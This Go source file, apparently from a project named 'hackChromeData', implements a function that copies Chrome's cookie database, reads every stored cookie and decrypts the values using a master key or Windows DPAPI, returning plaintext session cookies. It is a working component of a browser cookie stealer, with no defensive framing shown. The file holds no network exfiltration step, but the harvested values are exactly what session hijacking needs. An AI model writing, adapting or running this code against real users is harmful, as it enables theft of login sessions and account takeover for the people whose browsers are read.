package browsingdata

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"hackChromeData/decrypter"
	"hackChromeData/util"
	"log"
	"os"
	"time"
)

type ChromiumCookie []cookie

type cookie struct {
	Host         string `json:"host"`
	Path         string `json:"path"`
	KeyName      string `json:"keyname"`
	encryptValue []byte
	Value        string    `json:"value"`
	IsSecure     bool      `json:"secure"`
	IsHTTPOnly   bool      `json:"httponly"`
	HasExpire    bool      `json:"has_expire"`
	IsPersistent bool      `json:"persistent"`
	CreateDate   time.Time `json:"create_date"`
	ExpireDate   time.Time `json:"expire_date"`
}

func GetCookie(base64MasterKey string, filepath string) ([]cookie, error) {
	// Decode masterkey
	key, err := base64.StdEncoding.DecodeString(base64MasterKey)
	if err != nil {
		return nil, fmt.Errorf("Failed to decode master key: %w", err)
	}

	// Copy logindata db and journal file to current directory
	cFile := "./cookie"
	err = util.FileCopy(filepath, cFile)
	if err != nil {
		return nil, fmt.Errorf("DB FileCopy failed: %w", err)
	}
	defer os.Remove(cFile)

	cookieDB, err := sql.Open("sqlite3", fmt.Sprintf("file:%s", cFile))
	defer cookieDB.Close()
	rows, err := cookieDB.Query(`SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var c []cookie
	for rows.Next() {
		var (
			hostKey, host, path                           string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			value, encryptValue                           []byte
		)

		if err = rows.Scan(&hostKey, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent); err != nil {
			log.Println(err)
		}

		cookie := cookie{
			KeyName:      hostKey,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     util.IntToBool(isSecure),
			IsHTTPOnly:   util.IntToBool(isHTTPOnly),
			HasExpire:    util.IntToBool(hasExpire),
			IsPersistent: util.IntToBool(isPersistent),
			CreateDate:   util.TimeEpoch(createDate),
			ExpireDate:   util.TimeEpoch(expireDate),
		}
		if len(encryptValue) > 0 {
			var err error
			if key == nil {
				value, err = decrypter.DPApi(encryptValue)
			} else {
				value, err = decrypter.Chromium(key, encryptValue)
			}
			if err != nil {
				log.Println(err)
			}
		}
		cookie.Value = string(value)
		c = append(c, cookie)
	}
	return c, nil
}
